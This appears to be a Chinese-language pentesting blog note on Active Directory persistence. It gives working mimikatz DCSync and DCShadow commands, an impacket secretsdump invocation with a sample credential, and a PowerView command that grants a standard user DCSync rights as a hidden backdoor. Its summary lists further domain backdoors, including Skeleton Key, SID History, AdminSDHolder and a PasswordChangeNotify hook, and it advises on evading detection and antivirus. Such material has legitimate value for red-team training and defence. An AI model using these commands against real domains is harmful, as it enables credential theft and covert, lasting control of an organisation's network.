在不同的域控制器之间每15分钟就会同步一次数据，当一个域控想要从另一个域控获取数据时，客户端域控会向服务端域控发送GetNCChanges请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，**通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求**。

域内用户的权限最根本来自于DACL，对于DCSync来说,只要域用户有以下三条DACL即可向域控发起数据同步请求

```shell
复制目录更改（DS-Replication-Get-Changes）

全部复制目录更改 (DS-Replication-Get-Changes-All )

在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）
```

**注意**：对于只读域控制器(RODC)无法使用DCSync进行攻击，因为只读域控制器不能参与数据的同步

### 利用DCSync导出域内的hash

+ mimikatz的利用

  mimikatz自带一个dcsync的利用模块，我们可以利用mimikatz导出域内的hash

  当我们获取到域用户的权限时我们就可以dump域内hash，即使我们没有debug权限，因为DCsync去向域控发起请求并不是本地操作，而是通过网络请求

  执行以下命令dump hash

  ```shell
  #dump指定用户的信息，包括hash值
  mimikatz.exe "lsadump::dcsync /domain:hack.com /user:hack\Administrator" exit
  #导出域内所有用户的信息，包括hash值
  mimikatz.exe "lsadump::dcsync /domain:hack.com /all" exit
  mimikatz.exe "lsadump::dcsync /domain:hack.com /all /csv" exit
  ```
  
  ![dcsync-adminhash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dcsync-adminhash.png)
  
  一般域管用户和krbtgt用户的hash比较有用

+ 利用impacket项目中的脚本

  impacket中的srcretsdump.py支持通过DCSync技术导出域控制器中用户的hash.该工具可以使用提供的高权限用户的登陆凭据，从未加入域控制器的系统上远程连接至域控制器，并从注册表中导出本地账户的hash值，同时通过DCSync或卷影复制的方法，NTDS.dit文件中导出所有域用户的hash

  执行以下命令，并提供高权限用户的登陆凭据

  ```python
  python secretsdump.py hack.com/administratro:UU2FU3O@ADMIN@192.168.53.199 -just-dc-user "hack\Administrator"
  ```

  ![secretsdump](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/secretsdump.png)

  即使不在域内，也要跟DC在同一网段才可以dump

### 利用DCSync进行权限持久化

通过赋予标准用户DCSync的操作权限，从而制造隐蔽的后门，用户只需要前文提到的两条额外扩展权限即可控制DCSync

+ 通过powervive写入DCSync

  ```powershell
  Set-ExecutionPolicy Bypass -Scope Process
  Import-Module .\powerview.ps1
  Add-DomainObjectAcl -TargetIdentity "DC=hack,DC=com" -PrincipalIdentity hacker -Rights DCSync -Verbose
  ```


给hacker用户添加权限后，就可以通过hacker用户的凭据在远程主机上导出域内用户的hash值了(通过scretsdump.py)

### DCShadow

https://www.anquanke.com/post/id/96704

https://www.dcshadow.com/

DCShadow技术通过注册一个新的域控制器，利用数据复制的方法，将准备好的恶意对象注入合法的域控制器，以此来创建域后门

+ 利用mimikatz修改用户的RID

  通过修改用户的RID，将用户添加进特权组

  1.mimikatz执行以下命令

  ```shell
  mimikatz.exe "lsadump::dcshadow /object:CN=hacker,CN=Users,DC=hack,DC=com /attribute:primaryGroupID /value:512" exit
  ```

  2.开启一个新的窗口，通过mimikatz强行触发域复制,将数据推送到合法的域控制器

  ```shell 
  mimikatz.exe "lsadump::dcshadow /push" exit
  ```

  ![dcshadow](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dcshadow.png)

推送后就能看到hacker用户的RID已经被修改为512

![hacker-RID](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hacker-RID.png)

此外DCShadow还可以用于SID History的修改等来进行权限持久化 ，可在hacktricks上查看

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow

## 总结：

大概了解了一部分内网权限持久化的知识，但都比较基础

+ 常见后门：

  ```
  影子账户，不在用户中的用户
  系统服务后门，通过系统服务的自启动
  计划任务后门，与系统服务相似，在固定时间执行
  启动项\注册表键后门，通过系统或特定用户登陆时触发的后门
  ```

+ 事件触发类的

  ```
  WMI订阅事件
  
  屏幕保护程序，手动设置屏幕保护启动程序
  
  DLL劫持，通过恶意的DLL文件创建后门
  
  辅助功能劫持,最常见的shift粘滞键
  
  IFEO镜像劫持，修改注册表debugger字段
  ```

  **上述方法大部分针对于对一台机器的权限维持，并不涉及域，而且，大部分通过恶意程序直接返回会话。**

+ 域相关

  ```
  Skeleton Key万能钥匙，在内存中注入一个统一的域用户密码认证(通过lsass进程)，域控重启需要重新部署
  
  DSRM后门，通过修改注册表，使DSRM用户能够在任意时间登录与控制器，PTH即可获得持续的权限
  
  SID history，将域管用户的SID注入到普通用户的SID History当中，使普通用户拥有域管权限
  
  AdminSDHolder,操作AdminSDHolder的ACL普通用户对AdminSDHolder有完全控制权限，利用SDPROP来将该ACL同步到受保护的ACL
  
  Hook PasswordChangeNotify,用户更改密码时，会将密码保存在盘中，可通过脚本将修改后的密码发送到远程服务器
  
  DCSync,利用AD复制的原理，导出hash或是赋予标准用户DCSync的权限，使得标准用户能够远程导出hash，DCshadow技术对SID History和RID的操作
  ```

**与域有关的方法，侧重于对于域控机器的权限持久化，但都需要域管的权限，并且大部分要求有同一网段的主机能够进行通信 (即使是DCSync不要求你的机器在域中，但是也要能够进行通信)**

+ 从整体上来思考

  对于内网权限持久化来讲最重要的就是持久了(废话)，要持久就需要较高的隐蔽性，避免被发然后清除。如果可以，一定是希望所用的后门能够静默，例如域方法中的DCShadow就只有少量的日志，需要特定的监控方法。

+ 从个体上来看

  要能够在个体上建立持久化的后门，才能够保持与域控的通信，从而控制域控，即使能够在域控上保持权限，没有能够与之通信的机器也是没用的。所以，要求我们上传的后门程序足够隐蔽，在我看来，最好是把上传的文程序加入到白名单，避免被杀。同时还需要对杀软有一定的免疫性。
